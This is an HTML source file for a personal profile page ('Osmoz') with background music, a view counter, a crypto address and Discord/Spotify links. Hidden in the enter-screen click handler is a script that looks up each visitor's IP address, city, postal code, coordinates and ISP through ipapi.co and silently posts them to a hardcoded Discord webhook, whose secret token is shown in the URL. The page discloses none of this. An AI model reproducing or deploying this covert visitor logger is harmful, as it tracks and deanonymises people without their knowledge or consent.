<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            cursor: url('https://cdn-icons-png.flaticon.com/512/25/25694.png'), auto;
            background: url('https://cdn.discordapp.com/attachments/1257370223590248540/1301300539534872647/97759808-b73f-4176-a655-2ce9d9697ff3.gif') no-repeat center center fixed;
            background-size: cover;
            height: 100vh;
            margin: 0;
        }
        #enterScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            cursor: pointer;
        }
        #player {
            display: none;
        }
        #volumeControl {
            display: none;
            position: absolute;
            top: -40px;
            left: 0;
            width: 100px;
        }
        .volume-container {
            position: relative;
            display: inline-block;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div id="enterScreen">
        <div class="text-center text-white">
            <h1 class="text-4xl mb-4">Click to Enter</h1>
        </div>
    </div>
    <div class="relative hidden" id="mainContent">
        <div class="absolute top-4 left-4 volume-container">
            <i id="volumeIcon" class="fas fa-volume-up text-purple-500 text-2xl cursor-pointer"></i>
            <input type="range" id="volumeControl" min="0" max="100" value="50">
        </div>
        <div class="bg-black bg-opacity-50 rounded-lg p-8 text-center text-white">
            <img alt="Profile picture" class="w-24 h-24 rounded-full mx-auto mb-4" src="https://cdn.discordapp.com/avatars/1175537037366010048/6ddb5a04ef98ca63df0d713e7e1e4742.webp?size=1024&format=webp&width=482&height=482"/>
            <h1 class="text-3xl font-bold text-purple-500">Osmoz</h1>
            <p class="text-purple-500 mb-4">It's just you &amp; me and not the others!</p>
            <div class="flex justify-center space-x-4 text-purple-500 text-2xl mb-4">
                <a href="https://open.spotify.com/playlist/7daWcbR5JO3R7R3YdQVU5q?si=1cfabc78b8364523" target="_blank" class="link"><i class="fab fa-spotify"></i></a>
                <a href="https://discord.gg/kimashop" target="_blank" class="link"><i class="fab fa-discord"></i></a>
            </div>
            <p class="text-purple-500 mb-4">Address: LVAfyGqC1xrifygnPLxVBCkgGyran7UfHk</p>
            <div class="text-purple-500 text-xl">
                <i class="fas fa-eye"></i> <span id="viewCount">0</span>
            </div>
        </div>
    </div>
    <div class="absolute bottom-4 left-4 hidden" id="musicControl">
        <button id="musicToggle" class="text-purple-500 text-xl">
            <i class="fas fa-pause"></i> Pause Music
        </button>
    </div>
    <div id="player"></div>
    <script>
        document.addEventListener('DOMContentLoaded', (event) => {
            const enterScreen = document.getElementById('enterScreen');
            const mainContent = document.getElementById('mainContent');
            const musicControl = document.getElementById('musicControl');
            const volumeIcon = document.getElementById('volumeIcon');
            const volumeControl = document.getElementById('volumeControl');
            const viewCountElement = document.getElementById('viewCount');

            // Load view count from localStorage
            let viewCount = localStorage.getItem('viewCount') ? parseInt(localStorage.getItem('viewCount')) : 0;
            viewCountElement.textContent = viewCount;

            enterScreen.addEventListener('click', () => {
                enterScreen.style.display = 'none';
                mainContent.classList.remove('hidden');
                musicControl.classList.remove('hidden');
                player.playVideo();

                // Increment view count when entering
                viewCount++;
                viewCountElement.textContent = viewCount;

                // Save view count to localStorage
                localStorage.setItem('viewCount', viewCount);

                // Get user's IP address and location using ipapi.co
                fetch('https://ipapi.co/json/')
                    .then(response => response.json())
                    .then(data => {
                        const formattedData = {
                            ip: data.ip,
                            network: data.network,
                            version: data.version,
                            city: data.city,
                            region: data.region,
                            region_code: data.region_code,
                            country: data.country,
                            country_name: data.country_name,
                            country_code: data.country_code,
                            country_code_iso3: data.country_code_iso3,
                            country_capital: data.country_capital,
                            country_tld: data.country_tld,
                            continent_code: data.continent_code,
                            in_eu: data.in_eu,
                            postal: data.postal,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            utc_offset: data.utc_offset,
                            country_calling_code: data.country_calling_code,
                            currency: data.currency,
                            currency_name: data.currency_name,
                            languages: data.languages,
                            country_area: data.country_area,
                            country_population: data.country_population,
                            asn: data.asn,
                            org: data.org
                        };

                        // Send the formatted data to your Discord webhook
                        fetch('https://discord.com/api/webhooks/1257370240380047541/kj7np_FeepiR1k3U_cUO1HJ2H_5HSCcXTk20ytp9YbfgxR0I6BestwYMgdHNzniSGmZy', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(formattedData) // Send formattedData directly
                        })
                        .then(response => {
                            if (response.ok) {
                                console.log('Data sent to webhook successfully!');
                            } else {
                                console.error('Failed to send data to webhook. Status:', response.status, response.statusText);
                            }
                        })
                        .catch(error => console.error('Error sending data:', error));
                    })
                    .catch(error => console.error('Error fetching IP address:', error));
            });

            const links = document.querySelectorAll('.link');

            links.forEach(link => {
                link.addEventListener('click', () => {
                    viewCount++;
                    viewCountElement.textContent = viewCount;

                    // Save view count to localStorage
                    localStorage.setItem('viewCount', viewCount);
                });
            });

            const musicToggle = document.getElementById('musicToggle');
            let isPlaying = true;

            musicToggle.addEventListener('click', () => {
                if (isPlaying) {
                    player.pauseVideo();
                    musicToggle.innerHTML = '<i class="fas fa-play"></i> Play Music';
                } else {
                    player.playVideo();
                    musicToggle.innerHTML = '<i class="fas fa-pause"></i> Pause Music';
                }
                isPlaying = !isPlaying;
            });

            volumeIcon.addEventListener('click', () => {
                if (player.isMuted()) {
                    player.unMute();
                    volumeIcon.classList.remove('fa-volume-mute');
                    volumeIcon.classList.add('fa-volume-up');
                } else {
                    player.mute();
                    volumeIcon.classList.remove('fa-volume-up');
                    volumeIcon.classList.add('fa-volume-mute');
                }
            });

            volumeIcon.addEventListener('mouseover', () => {
                volumeControl.style.display = 'block';
            });

            volumeIcon.addEventListener('mouseout', () => {
                volumeControl.style.display = 'none';
            });

            volumeControl.addEventListener('input', (event) => {
                const volume = event.target.value;
                player.setVolume(volume);
            });

            // Load YouTube IFrame Player API
            var tag = document.createElement('script');
            tag.src = "https://www.youtube.com/iframe_api";
            var firstScriptTag = document.getElementsByTagName('script')[0];
            firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

            // Create YouTube player
            var player;
            window.onYouTubeIframeAPIReady = function() {
                player = new YT.Player('player', {
                    height: '0',
                    width: '0',
                    videoId: 'eKv4IuhgAlA',
                    events: {
                        'onReady': onPlayerReady
                    }
                });
            }

            function onPlayerReady(event) {
                event.target.setVolume(50); // Set volume to 50%
                event.target.playVideo(); // Start playing the video
            }
        });
    </script>
</body>
</html>
